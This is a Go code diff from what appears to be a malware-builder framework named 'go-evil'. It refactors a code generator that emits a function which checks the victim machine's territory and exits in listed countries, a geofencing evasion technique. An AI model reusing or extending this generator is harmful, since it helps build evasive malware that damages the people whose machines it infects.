@@ -4,6 +4,7 @@ import (
 	"fmt"
 
 	"github.com/TeamPhoneix/go-evil/utility/structure"
+	"github.com/TeamPhoneix/go-evil/utility/structure/functions"
 )
 
 // Disables boot of the program in certain countries
@@ -17,17 +18,19 @@ func Abort(s_json string, languages string) ([]string, string) {
 	arr.Uppercase()                          // Makes the contents of the array to uppercase
 	language_array := arr.To_string("array") // Returns []string{<content>}
 
-	data_object.Add_go_function([]string{
-		fmt.Sprintf("func %s(languages []string){", function_call),
-		"computer_lang, err := jibber_jabber.DetectTerritory()",
-		"if err != nil {",
-		"spine.log(err.Error())",
-		"return",
-		"}",
-		"for _, lang := range languages{",
-		"if lang == computer_lang{",
-		"os.Exit(0)",
-		"}}}"})
+	data_object.Add_go_function(functions.Go_func_t{Name: function_call, Func_type: "", Part_of_struct: "", Return_type: "",
+		Parameters: []string{"languages []string"},
+		Gut: []string{
+			"computer_lang, err := jibber_jabber.DetectTerritory()",
+			"if err != nil {",
+			"spine.log(err.Error())",
+			"return",
+			"}",
+			"for _, lang := range languages{",
+			"if lang == computer_lang{",
+			"os.Exit(0)",
+			"}}",
+		}})
 
 	data_object.Add_go_import("os")
 	data_object.Add_go_import("github.com/cloudfoundry/jibber_jabber")
